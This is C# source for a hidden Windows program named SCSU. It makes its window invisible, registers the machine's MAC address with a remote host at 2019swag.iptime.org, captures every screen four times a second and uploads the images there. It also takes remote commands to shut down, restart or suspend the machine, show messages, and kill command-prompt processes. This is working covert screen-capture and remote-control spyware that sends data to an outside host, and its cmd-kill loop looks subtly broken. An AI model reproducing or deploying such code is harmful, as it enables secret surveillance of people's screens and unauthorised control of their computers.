
using System;
using System.Net;
using System.Drawing;
using System.Diagnostics;
using System.Windows.Forms;
using Newtonsoft.Json.Linq;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Net.NetworkInformation;

namespace SCSU
{
    public partial class Form1 : Form
    {
        string captureText, settingJson, message;
        bool cmd = false;
        bool taskmgr = false;
        bool looping = true;
        public Form1()
        {
            InitializeComponent();
            Opacity = 0;
            ShowInTaskbar = false;
        }
        private void GetPicture_Tick(object sender, EventArgs e)
        {
            try
            {
                string url = settingJson;
                WebClient client = new WebClient();
                JArray setting = JArray.Parse(client.DownloadString(url));
                if ((bool)setting[0])
                {
                    System.Diagnostics.Process.Start("shutdown.exe", "-s -t 0");
                }
                else if ((bool)setting[1])
                {
                    System.Diagnostics.Process.Start("shutdown.exe", "-r -t 0");
                }
                else if ((bool)setting[2])
                {
                    Application.SetSuspendState(PowerState.Suspend, false, false);
                }
                else if ((bool)setting[3])
                {
                    message = setting[4].ToString();
                    Thread thread = new Thread(new ThreadStart(showMessagebox));
                    thread.Start();
                }

                if ((bool)setting["cmd"] != cmd)
                {
                    cmd = (bool)setting["cmd"];
                    System.Threading.Thread cmdthread = new Thread(new ThreadStart(cmdloop));
                    cmdthread.Start();
                }
                /*if ((bool)setting["taskmgr"] != taskmgr)
                {
                    taskmgr = (bool)setting["taskmgr"];
                    if (taskmgr)
                    {

                    }
                }*/
            }
            catch { }
        }
        private void cmdloop ()
        {
            while (cmd)
            {
                Process[] process = Process.GetProcessesByName("cmd.exe");
                process[0].Kill();
            }
        }
        private Bitmap CaptureImage(int i)
        {
            Rectangle rectangle = Screen.AllScreens[i].Bounds;
            int bpp = Screen.PrimaryScreen.BitsPerPixel;
            PixelFormat pixelFormat = PixelFormat.Format32bppArgb;
            if (bpp <= 16)
            {
                pixelFormat = PixelFormat.Format16bppRgb565;
            }
            else if (bpp == 24)
            {
                pixelFormat = PixelFormat.Format24bppRgb;
            }
            Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height, pixelFormat);
            using (Graphics gp = Graphics.FromImage(bitmap))
            {
                gp.CopyFromScreen(rectangle.Left, rectangle.Top, 0, 0, rectangle.Size);
            }
            Size resize = new Size(1280, 720);
            bitmap = new Bitmap(bitmap, resize);
            return bitmap;
        }
        private string ToBase64(Bitmap bitmap)
        {
            MemoryStream ms = new MemoryStream();
            bitmap.Save(ms, ImageFormat.Jpeg);
            return Convert.ToBase64String(ms.ToArray());
        }
        private void loop()
        {
            while (looping)
            {
                Hide();
                try
                {
                    Process[] AS = Process.GetProcessesByName("AS");
                    if (AS.Length <= 0) Process.Start("AS.exe");
                    Bitmap screen = CaptureImage(0);
                    string base64 = ToBase64(screen);
                    if (SystemInformation.MonitorCount > 1)
                    {
                        Bitmap second = CaptureImage(1);
                        base64 += ";" + ToBase64(second);
                    }
                    WebClient client = new WebClient();
                    client.Headers.Add("Content-Type", "text/plain");
                    client.UploadString(captureText, "PUT", base64);
                }
                catch { }
                System.Threading.Thread.Sleep(250);
            }
        }
        private void showMessagebox()
        {
            message = message.Replace('_',' ');
            MessageBox.Show(message,"New Message");
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Process.Start("AS.exe");
            WebClient client = new WebClient();
            string mac = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
            string url = "http://2019swag.iptime.org:1234/api/macJson/" + mac;
            string macadress = client.DownloadString(url);
            if (macadress == "Fail")
            {
                GetPicture.Stop();
                SCSUPopup popup = new SCSUPopup();
                popup.ShowDialog();
                Application.Restart();
            }
            else
            {
                string[] toUrl = macadress.Split(';');
                captureText = "http://2019swag.iptime.org:1234" + toUrl[0];
                settingJson = "http://2019swag.iptime.org:1234" + toUrl[1];
                GetPicture.Enabled = true;
                Thread thread = new Thread(new ThreadStart(loop));
                thread.Start();
            }
        }
    }
}
